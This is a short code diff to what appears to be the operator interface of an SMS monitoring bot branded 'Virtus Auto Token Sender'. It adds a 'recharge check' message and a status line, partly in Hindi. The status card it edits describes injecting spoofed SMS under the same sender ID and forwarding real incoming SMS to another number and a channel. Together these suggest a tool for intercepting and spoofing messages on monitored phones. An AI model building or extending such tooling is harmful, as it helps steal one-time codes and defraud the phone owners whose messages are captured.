@@ -7,6 +7,7 @@ from app.database import Device, MonitorProfile
 
 STARTUP_TEST_SENDER = "BABY"
 STARTUP_TEST_MESSAGE = "ASTIK TEST OK — module alive"
+RECHARGE_CHECK_MESSAGE = "CHACHA JI"
 BRAND_NAME = "Virtus Auto Token Sender"
 ASTIK_BRAND_LINE = f"──✦ <b>{BRAND_NAME}</b> ✦──"
 
@@ -605,6 +606,11 @@ def format_monitoring_card(
     channel = profile.channel_id or "—"
     mynum = resolve_mynum_phone(profile) or profile.phone_number
     real_sms = display_phone(mynum) if mynum else "—"
+    recharge_line = (
+        f"📲 Recharge check: \"{RECHARGE_CHECK_MESSAGE}\" → {real_sms} (SIM {sim_slot} se bheja)"
+        if mynum
+        else f"📲 Recharge check: /mynum set karo"
+    )
     device_tail = _device_phone_display(device)
     return (
         "✅ <b>SUCCESS</b>\n"
@@ -616,6 +622,7 @@ def format_monitoring_card(
         "📩 Incoming -&gt; spoof inject (same sender ID)\n"
         f"📞 Real SMS -&gt; {real_sms}\n"
         f"📢 Channel: {channel} (last /addchannel only)\n"
+        f"{recharge_line}\n"
         f"{auto_stop_line}\n"
         f"🗃️ Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
         f"{test_line}"
